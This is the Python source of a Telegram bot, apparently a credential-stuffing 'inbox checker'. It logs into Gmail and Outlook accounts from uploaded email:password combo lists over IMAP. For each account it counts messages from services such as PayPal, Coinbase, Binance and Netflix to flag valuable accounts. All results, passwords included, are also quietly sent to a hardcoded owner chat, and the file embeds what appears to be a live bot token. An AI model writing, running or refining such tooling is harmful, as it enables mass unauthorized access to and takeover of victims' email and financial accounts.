import logging
import imaplib
import re
import threading
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Telegram bot token
BOT_TOKEN = '7270907420:AAGkld5G9pjb9H3XyDZB5X2_p57MMjD8r88'                         
# Owner ID
OWNER_ID = 984192016

# Configure logging to a file
logging.basicConfig(filename='bot.log', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Targets to check in emails
TARGETS = [
    "instagram.com", "netflix.com", "spotify.com", "paypal.com",
    "cash.app", "adobe.com", "facebook.com", "coinbase.com",
    "binance.com", "eezy.com", "digitalocean.com", "supercell.com",
    "twitter.com", "snapchat.com", "linkedin.com", "tiktok.com", "x.com"
    "tumblr.com", "pinterest.com", "reddit.com", "github.com", "rockstargames.com" , "epicgames.com", "discord.com", "steampowered.com"
]

# Authorization management
authorized_users = {}  # Stores user IDs and expiration dates

def check_email_inbox(email_user, email_pass, targets):
    if "hotmail.com" in email_user or "outlook.com" in email_user:
        imap_server = "imap-mail.outlook.com"
    elif "gmail.com" in email_user:
        imap_server = "imap.gmail.com"
    else:
        return {}
    results = {}
    try:
        with imaplib.IMAP4_SSL(imap_server) as mail:
            mail.login(email_user, email_pass)
            mail.select("inbox")
            for target in targets:
                try:
                    status, messages = mail.search(None, f'FROM "{target}"')
                    if status == "OK":
                        results[target] = len(messages[0].split())
                    else:
                        results[target] = 0
                except Exception as e:
                    logger.error(f'Error checking target {target} for {email_user}: {e}')
                    results[target] = 0
    except imaplib.IMAP4.error as e:
        logger.error(f'IMAP error for {email_user}: {e}')
    return results

def filter_combos(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()
    return [line.strip() for line in lines if re.match(r'^[^@]+@[^@]+\.[^@]+:[^:]+$', line.strip())]

def process_file(file_path, update, context):
    combos = filter_combos(file_path)
    combo_pairs = [combo.split(':') for combo in combos]
    results = []
    total_emails_processed = 0
    total_hits = 0
    response_text = "Mail checking started for:\n\n"
    # Send initial message to the user
    progress_message = update.message.reply_text("Starting email checks...")
    
    for email_user, email_pass in combo_pairs:
        # Update the user with current email being checked
        progress_message.edit_text(f"Current mail: {email_user}\nMail count: {total_emails_processed}/{len(combo_pairs)}")
        data = check_email_inbox(email_user, email_pass, TARGETS)
        email_count = sum(data.values())
        if email_count > 0:
            total_hits += 1
        total_emails_processed += 1
        results.append((email_user, email_pass, data))
        time.sleep(3)  # Adding 3 seconds sleep to avoid spamming
    
    # Final status update
    response_text += "Mail checking completed\n"
    response_text += f"Total mails checked: {total_emails_processed}\n"
    response_text += f"Total hits: {total_hits}\n\n"
    response_text += "Detailed results:\n"
    for email_user, email_pass, data in results:
        response_text += f"{email_user}:{email_pass}\n"
        response_text += "━━━━━━━━[𝗜𝗡𝗕𝗢𝗫 📥]━━━━━━━━\n"
        for target, count in data.items():
            response_text += f"{target}: {count} emails\n"
        response_text += "\n"
    response_text += "\nAuthor: @roronoa_robot\n"
    
    # Save results to file
    output_file_path = f'result_{file_path}'
    with open(output_file_path, 'w') as output_file:
        output_file.write(response_text)
    
    # Send the results to the user
    update.message.reply_document(document=open(output_file_path, 'rb'), filename='result.txt')
    
    # Send results to the owner
    try:
        context.bot.send_message(chat_id=OWNER_ID, text=response_text)
    except Exception as e:
        logger.error(f'Error sending results to owner: {e}')

def handle_document(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id in authorized_users:
        file = update.message.document.get_file()
        file_path = file.download()
        logger.info(f'File downloaded to {file_path}')
        # Run the file processing in a separate thread
        threading.Thread(target=process_file, args=(file_path, update, context)).start()
    else:
        update.message.reply_text("You are not authorized to use this bot. Use /add <user_id> <days> to request authorization.")

def start(update: Update, _: CallbackContext) -> None:
    update.message.reply_text('Hi! Send me your combo file (email:password) and I will check the inbox for specific targets.')

def help_command(update: Update, _: CallbackContext) -> None:
    update.message.reply_text('Hi! Send me your Hotmail - Gmail combo file (email:password) and I will check the inbox for specific targets. Author:@roronoa_robot')

def add_authorization(update: Update, context: CallbackContext) -> None:
    if len(context.args) == 2:
        try:
            user_id = int(context.args[0])
            days = int(context.args[1])
            expiration_date = datetime.now() + timedelta(days=days)
            authorized_users[user_id] = expiration_date
            update.message.reply_text(f'Authorization added for ID {user_id} for {days} days.')
        except ValueError:
            update.message.reply_text('Please provide valid numbers for user ID and days.')
    else:
        update.message.reply_text('Usage: /add <user_id> <days>')

def remove_authorization(update: Update, _: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id in authorized_users:
        del authorized_users[user_id]
        update.message.reply_text(f'Authorization removed for ID {user_id}.')
    else:
        update.message.reply_text('You are not authorized.')

def show_authorization(update: Update, _: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id in authorized_users:
        expiration_date = authorized_users[user_id]
        days_left = (expiration_date - datetime.now()).days
        if days_left < 0:
            days_left = 0
            update.message.reply_text(f'Authorization expired for ID {user_id}. Please request a new authorization.')
        else:
            update.message.reply_text(f'User ID: `{user_id}`\nDays left: {days_left}', parse_mode='Markdown')
    else:
        update.message.reply_text('You are not authorized.')

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("add", add_authorization))
    dispatcher.add_handler(CommandHandler("remove", remove_authorization))
    dispatcher.add_handler(CommandHandler("id", show_authorization))
    dispatcher.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), handle_document))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    print("Telegram Bot by @roronoa_robot")
    main()
